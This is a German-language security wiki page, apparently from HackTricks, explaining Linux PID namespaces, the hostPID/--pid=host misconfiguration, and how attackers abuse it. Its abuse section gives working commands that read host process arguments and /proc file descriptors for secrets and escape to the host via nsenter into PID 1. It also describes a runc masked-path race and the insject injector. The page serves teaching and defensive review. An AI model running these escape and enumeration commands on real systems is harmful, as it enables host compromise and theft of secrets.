# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der PID namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container eine eigene PID 1 haben, obwohl er keine echte Maschine ist. Innerhalb des namespace sieht die workload einen lokalen Prozessbaum. Außerhalb des namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.

Aus Sicherheitssicht ist der PID namespace wichtig, weil die Sichtbarkeit von Prozessen wertvolle Informationen liefert. Sobald eine workload Host-Prozesse sehen kann, kann sie möglicherweise Servicenamen, Command-Line-Argumente, in Prozessargumenten übergebene Secrets, aus der Umgebung abgeleitete Zustände über `/proc` und potenzielle Ziele für den namespace-entry beobachten. Wenn sie mehr tun kann, als diese Prozesse nur zu sehen, beispielsweise unter den richtigen Bedingungen Signale zu senden oder `ptrace` zu verwenden, wird das Problem deutlich gravierender.

## Funktionsweise

Ein neuer PID namespace beginnt mit einer eigenen internen Prozessnummerierung. Der erste darin erstellte Prozess wird aus Sicht des namespace zu PID 1. Das bedeutet auch, dass er spezielle init-ähnliche Semantik für verwaiste Kindprozesse und das Signalverhalten erhält. Das erklärt viele Besonderheiten von Containern im Zusammenhang mit init-Prozessen, dem Aufräumen von Zombie-Prozessen und dem Einsatz kleiner init-Wrapper in Containern.

Die wichtige Sicherheitslehre ist, dass ein Prozess isoliert wirken kann, weil er nur seinen eigenen PID-Baum sieht, diese Isolation aber absichtlich aufgehoben werden kann. Docker stellt dies über `--pid=host` bereit, während Kubernetes dies über `hostPID: true` ermöglicht. Sobald der Container dem Host-PID-namespace beitritt, sieht die workload Host-Prozesse direkt, und viele nachfolgende Angriffspfade werden deutlich realistischer.

## Lab

So erstellst du manuell einen PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die Shell sieht nun eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, da es eine procfs-Instanz einbindet, die zum neuen PID-Namespace passt, sodass die Prozessliste innerhalb des Containers konsistent ist.

Zum Vergleich des Container-Verhaltens:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist unmittelbar und leicht verständlich, weshalb dies ein gutes erstes Lab für Leser ist.

## Laufzeitverwendung

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihren eigenen PID namespace. Kubernetes Pods erhalten normalerweise ebenfalls eine isolierte PID-Sicht, sofern der Workload nicht ausdrücklich die gemeinsame Nutzung der Host-PIDs anfordert. LXC/Incus-Umgebungen basieren auf demselben Kernel-Primitiv, wobei die Verwendung von System-Containern komplexere Prozessbäume sichtbar machen und zu mehr Debugging-Abkürzungen verleiten kann.

Dieselbe Regel gilt überall: Wenn die Runtime den PID namespace nicht isoliert hat, stellt dies eine bewusste Verringerung der Container-Grenze dar.

## Fehlkonfigurationen

Die typische Fehlkonfiguration ist die gemeinsame Nutzung des Host-PID namespace. Teams rechtfertigen dies häufig mit Debugging-, Monitoring- oder Service-Management-Komfort, es sollte jedoch immer als bedeutende Sicherheitsausnahme behandelt werden. Selbst wenn der Container keine unmittelbare Schreibmöglichkeit gegenüber Host-Prozessen besitzt, kann allein die Sichtbarkeit viele Informationen über das System offenlegen. Sobald Capabilities wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzukommen, steigt das Risiko erheblich.

Ein weiterer Fehler besteht in der Annahme, dass die gemeinsame Nutzung des Host-PID namespace harmlos sei, nur weil der Workload Host-Prozesse standardmäßig weder beenden noch per ptrace untersuchen kann. Diese Schlussfolgerung ignoriert den Wert der Enumeration, die Verfügbarkeit von Zielen für den Namespace-Eintritt und die Art und Weise, wie PID-Sichtbarkeit mit anderen abgeschwächten Kontrollen kombiniert werden kann.

## Missbrauch

Wenn der Host-PID namespace gemeinsam genutzt wird, kann ein Angreifer Host-Prozesse untersuchen, Prozessargumente sammeln, interessante Services identifizieren, geeignete PIDs für `nsenter` finden oder die Prozesssichtbarkeit mit ptrace-bezogenen Privilegien kombinieren, um Host- oder benachbarte Workloads zu beeinflussen. In manchen Fällen reicht es aus, den richtigen dauerhaft laufenden Prozess zu sehen, um den weiteren Angriffsplan neu auszurichten.

Der erste praktische Schritt besteht immer darin zu bestätigen, dass Host-Prozesse tatsächlich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, werden Prozessargumente und Namespace-Eintrittsziele oft zur nützlichsten Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und ausreichende Berechtigungen vorhanden sind, teste, ob ein sichtbarer Host-Prozess als Namespace-Bridge verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn der Zugriff blockiert ist, ist die gemeinsame Nutzung der Host-PIDs bereits wertvoll, da sie das Service-Layout, die Runtime-Komponenten und potenzielle privilegierte Prozesse offenlegt, die als Nächstes angegriffen werden können.

Die Sichtbarkeit der Host-PIDs macht auch den Missbrauch von File Descriptors realistischer. Wenn ein privilegierter Host-Prozess oder ein benachbarter Workload eine sensible Datei oder einen Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` untersuchen und dieses Handle abhängig von den Besitzverhältnissen, den procfs-Mount-Optionen und dem Servicemodell des Ziels wiederverwenden.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie beantworten, ob `hidepid=1` oder `hidepid=2` die Sichtbarkeit zwischen Prozessen einschränkt und ob offensichtlich interessante Deskriptoren wie geöffnete Geheimdateien, Logs oder Unix-Sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: Host-PID + `nsenter`

Das Teilen der Host-PIDs wird zu einem direkten Host-Escape, wenn der Prozess außerdem über ausreichende Berechtigungen verfügt, um den Host-Namespaces beizutreten:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, wird der Containerprozess nun in den Mount-, UTS-, Netzwerk-, IPC- und PID-Namespaces des Hosts ausgeführt. Die Auswirkung ist eine sofortige Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, kann dasselbe Ergebnis möglicherweise über das Host-Binary erreicht werden, sofern das Host-Dateisystem gemountet ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Runtime-Hinweise

Einige für PID-Namespaces relevante Angriffe sind keine herkömmlichen `hostPID: true`-Fehlkonfigurationen, sondern runtime-Implementierungsfehler im Umgang mit procfs-Schutzmechanismen während der Container-Einrichtung.

#### `maskedPaths`-Race zu host procfs

In verwundbaren `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollieren, die Maskierungsphase durch Ersetzen von containerseitigem `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` unterbrechen. Wenn die Race erfolgreich war, konnte der Bind-Mount des maskierten Pfads auf dem falschen Ziel landen und host-globale procfs-Schalter für den neuen Container offenlegen.<sup>[[1]](#references)</sup>

Nützlicher Review-Befehl:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dies ist wichtig, da die letztendlichen Auswirkungen dieselben wie bei einer direkten procfs-Exposition sein können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder einem Denial of Service.

#### Namespace-Injection mit `insject`

Tools für Namespace-Injection wie `insject` zeigen, dass die Interaktion mit einem PID-Namespace nicht immer erfordert, vor der Prozesserstellung in den Ziel-Namespace einzutreten. Ein Helper kann sich später anhängen, `setns()` verwenden und die Ausführung fortsetzen, während die Sichtbarkeit im Ziel-PID-Bereich erhalten bleibt:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist hauptsächlich für erweitertes Debugging, offensive tooling und post-exploitation workflows relevant, bei denen der Namespace-Kontext erst verbunden werden muss, nachdem die Laufzeit die Workload bereits initialisiert hat.

### Verwandte FD Abuse Patterns

Zwei Patterns sollten ausdrücklich erwähnt werden, wenn Host-PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen File Descriptor über `execve()` hinweg geöffnet halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Services File Descriptors über Unix-Sockets mithilfe von `SCM_RIGHTS` übertragen. In beiden Fällen ist nicht mehr der Pfadname das interessante Objekt, sondern der bereits geöffnete Handle, den ein Prozess mit geringeren Rechten erben oder empfangen kann.

Das ist bei Container-Arbeit relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine Secret-Datei des Hosts oder ein anderes wertvolles Objekt verweisen kann, selbst wenn der Pfad selbst vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Prüfungen

Der Zweck dieser Befehle besteht darin festzustellen, ob der Prozess eine private PID-Sicht hat oder ob er bereits eine wesentlich umfassendere Prozesslandschaft auflisten kann.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Was ist hier interessant:

- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist die gemeinsame Nutzung der Host-PIDs wahrscheinlich bereits aktiviert.
- Nur einen winzigen, containerlokalen Prozessbaum zu sehen, ist der normale Ausgangszustand; `systemd`, `dockerd` oder nicht zugehörige Daemons zu sehen, ist es nicht.
- Sobald Host-PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen für die reconnaissance nützlich.

Wenn du einen Container entdeckst, der mit gemeinsamer Nutzung der Host-PIDs läuft, solltest du dies nicht als kosmetischen Unterschied betrachten. Dadurch ändert sich erheblich, was die workload beobachten und potenziell beeinflussen kann.

## Referenzen

- [1] [runc-Sicherheitswarnung: Container Escape durch den Missbrauch von „masked path“ aufgrund von Race Conditions bei Mounts (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool-Veröffentlichung – insject: Ein Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
